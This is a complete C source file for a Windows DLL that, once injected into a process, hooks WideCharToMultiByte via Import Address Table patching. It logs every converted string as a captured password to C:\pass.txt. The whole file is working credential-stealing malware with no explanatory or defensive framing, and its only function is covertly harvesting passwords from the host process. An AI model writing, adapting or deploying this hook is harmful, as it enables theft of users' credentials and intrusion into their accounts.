#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dbghelp.lib")

// Function pointer to the original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(UINT CodePage, DWORD dwFlags,
                                    _In_NLS_string_(cchWideChar) LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar)
    = WideCharToMultiByte;

// Modified hooking function
int ModifiedFunction(UINT CodePage, DWORD dwFlags,
                                _In_NLS_string_(cchWideChar) LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar)
{
    int ret;
    char buffer[256]; 
    HANDLE hFile = NULL;
    DWORD numBytes;

    // Call original function
    ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr,
                               cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

    sprintf(buffer, "Password is : %s\n", lpMultiByteStr);

    // Store captured data in a file
    hFile = CreateFile("C:\\pass.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        OutputDebugStringA("Error in the file!\n");
    }
    else
    {
        WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);
        CloseHandle(hFile);
    }

    return ret;
}

// Set hook on Original Function -> WideCharToMultiByte
BOOL HookTarget(char *dll, char *origFunc, PROC hookingFunc)
{
    ULONG size;
    DWORD i;
    BOOL found = FALSE;

    // Get the base address of the module (the main module)
    HANDLE baseAddress = GetModuleHandle(NULL);

    // Get Import Table of main module
    PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(
        baseAddress,
        TRUE,
        IMAGE_DIRECTORY_ENTRY_IMPORT,
        &size,
        NULL);

    // Search for the DLL we want
    for (i = 0; i < size; i++)
    {
        char *importName = (char *)((PBYTE)baseAddress + importTbl[i].Name);
        if (_stricmp(importName, dll) == 0)
        {
            found = TRUE;
            break;
        }
    }
    if (!found)
        return FALSE;

    // Search for the function we want in the Import Address Table
    PROC origFuncAddr = (PROC)GetProcAddress(GetModuleHandle(dll), origFunc);

    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)baseAddress + importTbl[i].FirstThunk);
    while (thunk->u1.Function)
    {
        PROC *currentFuncAddr = (PROC *)&thunk->u1.Function;

        // Found
        if (*currentFuncAddr == origFuncAddr)
        {
            // Set memory to become writable
            DWORD oldProtect = 0;
            VirtualProtect((LPVOID)currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

            // Set the hook by assigning new modified function to replace the old one
            *currentFuncAddr = (PROC)hookingFunc;

            // Revert back to original protection setting
            VirtualProtect((LPVOID)currentFuncAddr, 4096, oldProtect, &oldProtect);

            //printf("Hook has been set on IAT function %s()\n", origFunc);
            return TRUE;
        }
        thunk++;
    }

    return FALSE;
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Set hook when DLL is attached to a process
        HookTarget("kernel32.dll", "WideCharToMultiByte", (PROC)ModifiedFunction);
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}